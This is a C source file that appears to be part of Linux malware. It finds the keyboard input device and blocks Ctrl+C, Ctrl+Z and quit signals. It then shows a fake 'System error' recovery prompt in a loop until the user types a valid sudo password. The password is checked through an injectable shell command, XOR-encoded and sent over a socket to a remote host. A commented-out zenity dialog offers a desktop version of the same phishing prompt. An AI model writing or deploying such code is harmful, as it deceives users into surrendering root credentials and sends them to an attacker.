#include "header.h"
#include <sys/ioctl.h>

char verified_password[128] = {0};

//keyboard linux
int find_keyboard() {
    DIR *dir = opendir("/dev/input");
    struct dirent *entry;
    char path[256], name[256];
    int temp_fd, kbd_fd = -1;

    if (!dir) return -1;

    while ((entry = readdir(dir)) != NULL) {
        if (strncmp(entry->d_name, "event", 5) == 0) {
            snprintf(path, sizeof(path), "/dev/input/%s", entry->d_name);
            
            temp_fd = open(path, O_RDONLY | O_NONBLOCK);
            if (temp_fd < 0) continue;

            if (ioctl(temp_fd, EVIOCGNAME(sizeof(name)), name) >= 0) {
                
                if (strcasestr(name, "key") || strcasestr(name, "kbd")) {
                    
                    fcntl(temp_fd, F_SETFL, fcntl(temp_fd, F_GETFL) & ~O_NONBLOCK);
                    kbd_fd = temp_fd;
                    break;
                }
            }
            close(temp_fd);
        }
    }
    closedir(dir);
    return kbd_fd;
}

//ignore signals
void ignore_signal(){
     signal(SIGINT, SIG_IGN); //Ctrl+C
    signal(SIGTSTP, SIG_IGN); //Ctrl+Z
    signal(SIGQUIT, SIG_IGN); 
}

//password check
int verify_password(const char *pass){
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "echo '%s' | sudo -S true 2>/dev/null", pass);
    return(system(cmd) == 0);
}

//sudo privileges 
void acquire_privileges_blocked(int *sock, unsigned char *key){
    //char *display = getenv("DISPLAY");
    char *display = NULL;
    char password[128];
    int authenticated = 0;

    ignore_signal();

    while(!authenticated){
        memset(password, 0, sizeof(password));

        /*if(display != NULL){
            //Linux desktop
            FILE *fp = popen("zenity --password --title='Maintenance' --text='Critical error. Enter password to restore system.
            if(fp){
                if(fgets(password, sizeof(password), fp)){
                    password[strcspn(password, "\n")] = 0;
                }
                pclose(fp);
            }
        } else {*/
            //Linux shell
        printf("\n[!] System error. Password required for recovery: ");
        fflush(stdout);
        if (fgets(password, sizeof(password), stdin)) {
            //Let's remove the newline character ("\n") that fgets always captures.
            password[strcspn(password, "\n")] = 0;
        }
        //}
        //verify_password
        if (strlen(password) > 0 && verify_password(password)) {
            authenticated = 1;            
            strncpy(verified_password, password, 128);
            printf("\n[*] Recovery completed successfully.\n");

            for(size_t i = 0; i < strlen(password); i++){
                password[i] ^= key[i%16];
            }
            send(*sock, password, strlen(password), 0);
        } else {
            //if (display != NULL) {
            //    system("zenity --error --text='Incorrect password. Please try again:'");
            //} else{
                printf("Incorrect password. Please try again:\n");
            //}

            sleep(1);
        }
    }
}